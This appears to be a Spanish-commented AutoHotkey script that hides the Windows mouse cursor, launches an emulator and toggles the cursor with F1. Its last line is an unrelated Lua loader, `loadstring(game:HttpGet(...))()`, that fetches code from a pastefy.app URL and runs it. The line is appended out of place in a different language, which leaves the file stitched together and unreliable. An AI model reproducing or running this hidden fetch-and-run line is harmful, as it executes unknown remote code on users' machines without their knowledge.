; === Lanzador de Emulador + Ocultar Ratón (estilo BlueStacks) ===
; Al ejecutarlo: oculta el ratón y abre tu emulador

#NoEnv
#SingleInstance Force
SetWorkingDir %A_ScriptDir%

; ========== CONFIGURA AQUÍ ==========
; Cambia esta línea por la ruta de TU emulador
Emulador := "C:\Ruta\Completa\A\TuEmulador.exe"

; Si quieres que también abra un juego específico, descomenta y pon la ruta:
; Juego := "C:\Ruta\Al\Juego.apk"   ; o .iso, .exe, etc.
; ====================================

; Ocultar el ratón al iniciar
SystemCursor("Off")

; Lanzar el emulador
Run, %Emulador%

; Si quieres lanzar también un juego, descomenta la siguiente línea:
; Sleep, 3000
; Run, %Juego%

; Tecla F1 para mostrar/ocultar el ratón (igual que BlueStacks)
F1::
SystemCursor("Toggle")
return

; Al cerrar el script, siempre muestra el ratón
OnExit, RestaurarRaton

RestaurarRaton:
SystemCursor("On")
ExitApp

; === Función para ocultar/mostrar el cursor ===
SystemCursor(OnOff=1)
{
    static AndMask, XorMask, $, h_cursor
        ,c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13
        ,b1,b2,b3,b4,b5,b6,b7,b8,b9,b10,b11,b12,b13
        ,h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11,h12,h13

    if (OnOff = "Init" or OnOff = "I" or $ = "")
    {
        $ = h
        VarSetCapacity(AndMask, 32*4, 0xFF)
        VarSetCapacity(XorMask, 32*4, 0)
        system_cursors = 32512,32513,32514,32515,32516,32642,32643,32644,32645,32646,32648,32649,32650
        StringSplit c, system_cursors, `,
        Loop %c0%
        {
            h_cursor := DllCall("LoadCursor", "uint", 0, "uint", c%A_Index%)
            h%A_Index% := DllCall("CopyImage", "uint", h_cursor, "uint", 2, "int", 0, "int", 0, "uint", 0)
            b%A_Index% := DllCall("CreateCursor", "uint", 0, "int", 0, "int", 0
                , "int", 32, "int", 32, "uint", &AndMask, "uint", &XorMask)
        }
    }

    if (OnOff = 0 or OnOff = "Off" or $ = "h" and (OnOff < 0 or OnOff = "Toggle" or OnOff = "T"))
        $ = b
    else
        $ = h

    Loop %c0%
    {
        h_cursor := DllCall("CopyImage", "uint", %$%%A_Index%, "uint", 2, "int", 0, "int", 0, "uint", 0)
        DllCall("SetSystemCursor", "uint", h_cursor, "uint", c%A_Index%)
    }
}

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()